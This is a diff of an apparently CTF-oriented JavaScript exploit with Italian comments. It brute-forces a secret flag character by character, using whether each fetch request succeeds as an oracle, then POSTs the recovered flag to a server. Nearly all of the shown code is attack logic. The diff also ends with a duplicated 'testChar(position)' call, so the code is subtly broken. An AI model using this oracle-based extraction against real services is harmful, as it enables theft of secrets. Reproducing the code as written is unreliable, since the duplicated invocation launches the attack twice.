@@ -15,7 +15,6 @@ const testChar = (position) => {
             })
             .then(response => {
                 // Non possiamo accedere alla risposta, quindi facciamo affidamento sul comportamento
-                // Potresti considerare un timeout o un meccanismo alternativo per il riconoscimento
                 if (response.ok) {
                     console.log(`Trovato carattere ${char} per la posizione ${position}`);
                     currentFlag += char; // Aggiungi carattere
@@ -25,7 +24,9 @@ const testChar = (position) => {
                     console.log(`Carattere ${char} non valido per la posizione ${position}`);
                 }
             })
-            .catch(error => console.error('Errore:', error));
+            .catch(error => {
+                console.error('Errore nella richiesta:', error);
+            });
         }
     } else {
         console.log(`Flag completa: ${currentFlag}`);
@@ -38,10 +39,13 @@ const testChar = (position) => {
             body: `flag=${encodeURIComponent(currentFlag)}`
         })
         .then(response => response.text())
-        .then(data => console.log(data))
-        .catch(error => console.error('Errore:', error));
+        .then(data => console.log('Risposta dal server:', data))
+        .catch(error => console.error('Errore durante l\'invio della flag:', error));
     }
 };
+
+// Inizia il test
+testChar(position);
 
 // Inizia il test
 testChar(position);
